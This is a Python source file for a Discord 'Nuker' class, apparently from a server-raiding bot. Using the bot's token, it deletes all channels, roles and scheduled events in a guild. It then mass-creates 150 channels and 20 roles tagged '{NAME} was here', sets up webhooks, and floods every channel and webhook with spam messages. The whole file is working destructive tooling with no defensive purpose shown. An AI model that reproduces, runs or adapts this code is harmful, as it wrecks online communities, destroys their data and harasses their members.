import base64
import datetime
from datetime import datetime, timedelta
from typing import List, Optional, Any

from aiohttp import ClientSession
from core.config import SPAMMSG, WEBNAME, WEBICON, CHANNEL_NAME, NAME
from core.async_task import create_tasks, request

BASE_URL = "https://discord.com/api/v10"

_icon_cache: Optional[str] = None


async def _fetch_icon(url: str) -> str:
    global _icon_cache
    if _icon_cache:
        return _icon_cache
    try:
        async with ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return ""
                data = await resp.read()
        mime = "image/png"
        b64 = base64.b64encode(data).decode("utf-8")
        _icon_cache = f"data:{mime};base64,{b64}"
        return _icon_cache
    except Exception:
        return ""


class Nuker:
    def __init__(self, ctx, user_config: dict = None):
        self.ctx = ctx
        self.user_config = user_config or {}
        token = ctx.bot.token
        self.headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bot {token}",
        }

    async def crChannels(self):
        channel_names = self.user_config.get("channel_names") or CHANNEL_NAME
        urls = [f"{BASE_URL}/guilds/{self.ctx.guild.id}/channels" for _ in range(150)]
        jsons = [{"name": channel_names[i % len(channel_names)], "type": 0} for i in range(150)]

        async with ClientSession(headers=self.headers) as session:
            results = await create_tasks(
                urls, session.post, self.headers, jsons, return_json=True
            )

        channels = [c for c in results if not isinstance(c, Exception)]
        if not channels:
            return [], []

        icon_url = WEBICON[0] if WEBICON else ""
        icon_data = await _fetch_icon(icon_url) if icon_url else ""

        webhook_urls = [
            f"{BASE_URL}/channels/{c['id']}/webhooks" for c in channels
        ]
        webhook_jsons = [
            {
                "name": WEBNAME[hash(c["id"]) % len(WEBNAME)],
                **({"avatar": icon_data} if icon_data else {}),
            }
            for c in channels
        ]

        async with ClientSession(headers=self.headers) as session:
            webhook_results = await create_tasks(
                webhook_urls, session.post, self.headers, webhook_jsons, return_json=True
            )

        webhooks = [w for w in webhook_results if not isinstance(w, Exception)]

        return channels, webhooks

    async def delChannels(self):
        async with ClientSession(headers=self.headers) as session:
            async with session.get(
                f"{BASE_URL}/guilds/{self.ctx.guild.id}/channels"
            ) as resp:
                if resp.status == 204:
                    return
                channels = await resp.json()
                if not channels:
                    return

        urls = [f"{BASE_URL}/channels/{c['id']}" for c in channels]
        async with ClientSession(headers=self.headers) as session:
            await create_tasks(urls, session.delete, self.headers)

    async def spam(self):
        channels = self.ctx.guild.text_channels + self.ctx.guild.voice_channels
        urls = []
        for channel in channels:
            urls.extend(
                [
                    f"{BASE_URL}/channels/{channel.id}/messages"
                    for _ in range(5)
                ]
            )
        content = self.user_config.get("spam_message") or SPAMMSG
        jsons = [{"content": content}] * len(urls)
        async with ClientSession(headers=self.headers) as session:
            await create_tasks(urls, session.post, self.headers, jsons)

    async def spamWebhooks(self, webhooks):
        if not webhooks:
            return
        urls = []
        jsons = []
        content = self.user_config.get("spam_message") or SPAMMSG
        for w in webhooks:
            wid = w.get("id")
            token = w.get("token")
            if wid and token:
                for _ in range(5):
                    urls.append(f"https://discord.com/api/webhooks/{wid}/{token}")
                    jsons.append({"content": content})
        if urls:
            async with ClientSession() as session:
                await create_tasks(urls, session.post, {}, jsons)

    async def ensureWebhooks(self):
        async with ClientSession(headers=self.headers) as session:
            async with session.get(f"{BASE_URL}/guilds/{self.ctx.guild.id}/channels") as resp:
                if resp.status == 204:
                    return []
                channels = await resp.json()
                if not channels:
                    return []

        icon_url = WEBICON[0] if WEBICON else ""
        icon_data = await _fetch_icon(icon_url) if icon_url else ""

        webhooks = []
        webhook_urls = []
        webhook_jsons = []
        for c in channels:
            webhook_urls.append(f"{BASE_URL}/channels/{c['id']}/webhooks")
            webhook_jsons.append({
                "name": WEBNAME[hash(c["id"]) % len(WEBNAME)],
                **({"avatar": icon_data} if icon_data else {}),
            })

        async with ClientSession(headers=self.headers) as session:
            results = await create_tasks(
                webhook_urls, session.post, self.headers, webhook_jsons, return_json=True
            )
        webhooks = [w for w in results if not isinstance(w, Exception)]
        return webhooks

    async def crRoles(self, name: str = f"{NAME} was here", count: int = 20):
        urls = [f"{BASE_URL}/guilds/{self.ctx.guild.id}/roles" for _ in range(count)]
        jsons = [{"name": name} for _ in range(count)]
        async with ClientSession(headers=self.headers) as session:
            await create_tasks(urls, session.post, self.headers, jsons)

    async def delRoles(self):
        urls = [
            f"{BASE_URL}/guilds/{self.ctx.guild.id}/roles/{role.id}"
            for role in self.ctx.guild.roles
        ]
        async with ClientSession(headers=self.headers) as session:
            await create_tasks(urls, session.delete, self.headers)

    async def create_event(self, name: Optional[str] = None, description: Optional[str] = None):
        event_name = name or f"{NAME}"
        event_desc = description or event_name
        start_time = datetime.now().isoformat()
        end_time = (datetime.now() + timedelta(days=30)).isoformat()
        json = {
            "channel_id": None,
            "entity_metadata": {"location": event_name},
            "name": event_name,
            "privacy_level": 2,
            "scheduled_start_time": start_time,
            "scheduled_end_time": end_time,
            "description": event_desc,
            "entity_type": 3,
            "image": None,
        }
        url = f"{BASE_URL}/guilds/{self.ctx.guild.id}/scheduled-events"
        async with ClientSession(headers=self.headers) as session:
            await request(session.post, url, self.headers, json)

    async def delete_events(self):
        url = f"{BASE_URL}/guilds/{self.ctx.guild.id}/scheduled-events"
        async with ClientSession(headers=self.headers) as session:
            async with session.get(url) as resp:
                if resp.status == 204:
                    return
                events = await resp.json()

        urls = [
            f"{BASE_URL}/guilds/{self.ctx.guild.id}/scheduled-events/{event['id']}"
            for event in events
        ]
        async with ClientSession(headers=self.headers) as session:
            await create_tasks(urls, session.delete, self.headers)
